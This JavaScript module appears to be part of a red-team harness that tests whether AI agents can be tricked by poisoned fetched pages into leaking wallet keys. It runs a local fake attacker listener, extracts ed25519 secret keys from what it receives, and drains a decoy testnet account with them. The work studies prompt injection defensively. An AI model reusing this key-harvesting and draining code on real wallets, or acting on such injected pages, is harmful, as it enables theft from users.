// The thief. A local listener on 127.0.0.1 plays "attacker.invalid" (no real external host is ever
// contacted); whatever key it receives is used for a real testnet transfer out of the decoy account.
import http from 'node:http';
import path from 'node:path';
import { REPO } from './sandbox.mjs';

const KEY_RE = /ed25519:[1-9A-HJ-NP-Za-km-z]{40,100}/g;

export function extractKeys(text) {
  const all = [...new Set(String(text).match(KEY_RE) || [])];
  const secrets = all.filter((k) => k.length >= 80); // 64-byte secret keys; public keys are ~52 chars
  return secrets.length ? secrets : all;
}

export function startListener(onLoot) {
  const loot = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const keys = extractKeys(`${req.url}\n${body}`);
      loot.push({ at: new Date().toISOString(), method: req.method, url: req.url, bytes: body.length, keys });
      onLoot?.(loot.at(-1));
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end('ok');
    });
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => {
    const port = server.address().port;
    resolve({ port, url: `http://127.0.0.1:${port}`, loot, close: () => new Promise((r) => server.close(r)) });
  }));
}

/** Pages served by the local "attacker" site, e.g. a poisoned issue text for fetch-based injection. */
export function startSite(pages) {
  const server = http.createServer((req, res) => {
    const body = pages[req.url.split('?')[0]];
    res.writeHead(body ? 200 : 404, { 'content-type': 'text/html' });
    res.end(body || 'not found');
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => {
    resolve({ port: server.address().port, close: () => new Promise((r) => server.close(r)) });
  }));
}

async function core() {
  return import(path.join(REPO, 'packages/core/src/index.ts'));
}

/** Use a stolen decoy key: move `amountNear` out of the decoy account to the attacker account (testnet). */
export async function drain(secretKey, opts = {}) {
  let r;
  for (let i = 0; i < 5; i++) { // public RPC rate-limits (HTTP 429): the thief is persistent
    r = await drainOnce(secretKey, opts);
    if (r.ok || r.skipped || !/429|Exceeded \d+ providers|timeout/i.test(r.error || '')) break;
    await new Promise((s) => setTimeout(s, 1500 * (i + 1)));
  }
  return r;
}

async function drainOnce(secretKey, { amountNear = 0.1, fromAccount, all = false } = {}) {
  if (process.env.STANDIN_CHAIN === 'off') return { ok: false, skipped: 'STANDIN_CHAIN=off' };
  const t0 = Date.now();
  try {
    const c = await core();
    const cfg = c.loadNetworkConfig();
    const decoy = fromAccount || c.requireAccount(cfg, 'decoy');
    const attacker = c.requireAccount(cfg, 'attacker');
    const acct = c.makeAccount(cfg, decoy, secretKey);
    let yocto = BigInt(Math.round(amountNear * 1e6)) * 10n ** 18n;
    if (all) { // baseline: take everything but a small reserve
      const bal = BigInt((await c.makeProvider(cfg).viewAccount({ accountId: decoy })).amount);
      yocto = bal - 10n ** 23n;
    }
    const res = await acct.signAndSendTransaction({ receiverId: attacker, actions: [c.actions.transfer(yocto)], waitUntil: 'EXECUTED_OPTIMISTIC' });
    const tx_hash = String(res.transaction?.hash ?? res.transaction_outcome?.id);
    return { ok: true, tx_hash, decoy, attacker, amount_near: amountNear, sent_at: new Date(t0).toISOString(), ms: Date.now() - t0 };
  } catch (e) {
    return { ok: false, error: String(e.message || e).slice(0, 300), ms: Date.now() - t0 };
  }
}

/** The thief after a loot arrives: try every key, stop at the first success. */
export async function drainWith(keys, opts) {
  const attempts = [];
  for (const k of keys) {
    const r = await drain(k, opts);
    attempts.push({ key_public_hint: k.slice(0, 16) + '…', ...r });
    if (r.ok || r.skipped) break;
  }
  return attempts;
}
